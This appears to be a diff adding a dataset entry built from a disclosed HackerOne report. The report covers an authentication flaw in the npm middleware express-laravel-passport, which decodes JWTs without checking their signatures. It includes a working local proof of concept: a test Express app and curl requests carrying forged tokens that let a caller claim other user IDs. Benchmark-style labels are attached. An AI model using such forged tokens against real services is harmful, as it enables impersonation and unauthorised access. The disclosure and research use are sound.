@@ -1,0 +1,56 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "ermilov ",
+  "title": "[express-laravel-passport] Improper Authentication",
+  "content": "\nI would like to report Improper Authentication in express-laravel-passport\nIt allows to forge user's identity\nModule\nmodule name: express-laravel-passport\nversion: 1.1.2\nnpm page: https://www.npmjs.com/package/express-laravel-passport\nModule Description\nYou want a middleware support express get authorization from laravel-passport-structured database, this will help you.\nModule Stats\n14 weekly downloads\nVulnerability\nVulnerability Description\nexpress-laravel-passport is an authentication middleware which utilizes JWT tokens. The module defined to handle authentication but does not validate the JWT token sent by the user. Therefore it allows modifying payload within the token. This weakness provides an opportunity to forge the user's identity by changing the information inside the token's payload that is used to authenticate the client.\nsource code example:\nhttps://github.com/EugeneNguyen/express-laravel-passport/blob/master/src/index.js#L13\nCode 34 Bytes\n1const { jti } = jwt.decode(token);\njti variable retrieved from the token without any verification\nSteps To Reproduce:\ncreate directory for testing\nCode 17 Bytes\n1mkdir poc\n2cd poc/\ninstall dependencies required for express-laravel-passport and test app to work\nCode 90 Bytes\n1npm init\n2npm i express\n3npm i sequelize@4.32.7\n4npm i sqlite3\n5npm i express-laravel-passport\ncreate index.js with test application code\nCode 1.14 KiB\n1const express = require('express')\n2const Sequelize = require('sequelize')\n3const passport = require('express-laravel-passport')\n4\n5// create inmemory Sqlite DB for testing purposes\n6const sequelize = new Sequelize('database', 'username', 'password', {dialect: 'sqlite'})\n7\n8// init express\n9const app = express()\n10const port = 3000\n11\n12// create instance of `express-laravel-passport`\n13const passportMiddleware = passport(sequelize)\n14\n15// create db Model that simulates structure required for `express-laravel-passport` to work properly\n16const Model = sequelize.define('oauth_access_tokens', {\n17  user_id: Sequelize.INTEGER\n18}, {\n19  timestamps: false\n20});\n21\n22// create DB\n23sequelize.sync()\n24  // put some test data to DB\n25  .then(() => Model.bulkCreate([{user_id:1},{user_id:2},{user_id:3}]))\n26  // run the express app with `express-laravel-passport` as middleware\n27  .then(() => {\n28    app.get('/', passportMiddleware, (req, res) => {\n29      const user_id = req.user_id;\n30      if (user_id) {\n31        res.send(`logged in as: ${user_id}\\n`)\n32      } else {\n33        res.send('not logged in\\n')\n34      }\n35    })\n36\n37    app.listen(port, () => console.log(`Example app listening on port ${port}!`))\n38  })\nrun it\nCode 13 Bytes\n1node index.js\nthe app runs on localhost:3000, so now you can send requests to this address in order to test its behaviour\nsend crafted request with JWT token in authorization header token is eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc\nwhich represents this payload: {\"jti\": 1} and was simply created at www.jwt.io\nCode 139 Bytes\n1curl -H \"authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc\" localhost:3000\nlogged in as: 1 is logged to the console as a result\nsend another crafted request with JWT token in authorization header token is eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc\nwhich represents this payload: {\"jti\": 2} BUT keeps the signature from previous token (n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc), therefore this token is not valid by any means\nCode 139 Bytes\n1curl -H \"authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc\" localhost:3000\nlogged in as: 2 is logged to the console as a result, which illustrates the fact that it is possible to forge JWT tokens and fake id of the user.\nWhile testing you can put a breakpoint in poc/node_modules/express-laravel-passport/src/index.js file on line 13, to make sure that it is the express-laravel-passport responsible for handling token verification\nPatch\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Linux Mint current\nNODEJS VERSION: 12.7.0\nNPM VERSION: 6.10.0\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nThis weakness provides opportunity to forge user's identity by changing information inside token's payload that is used to verify the client.\n\n",
+  "severity": [
+    7.5,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Improper Authentication - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1578193740,
+  "report_url": "https://hackerone.com/reports/748214",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Create a test directory and install required dependencies (express, sequelize, sqlite3, express-laravel-passport)"
+    ],
+    [
+      2,
+      "Create an index.js file with test application code that uses express-laravel-passport middleware"
+    ],
+    [
+      3,
+      "Run the application and send crafted JWT tokens in the authorization header to demonstrate the vulnerability"
+    ],
+    [
+      4,
+      "Observe that the application accepts modified tokens without proper validation, allowing identity forgery"
+    ]
+  ],
+  "vuln_description": "The express-laravel-passport middleware fails to properly validate JWT tokens, allowing attackers to modify the token payload and forge user identities by changing the 'jti' claim without signature verification.",
+  "reason": "The vulnerability is straightforward to discover as it involves basic JWT manipulation and only requires observing that the middleware doesn't perform signature verification. The attack doesn't involve complex interactions or state manipulation.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": true,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "idor_detectable": false,
+    "authnz_byppass_detectable": true
+  }
+}
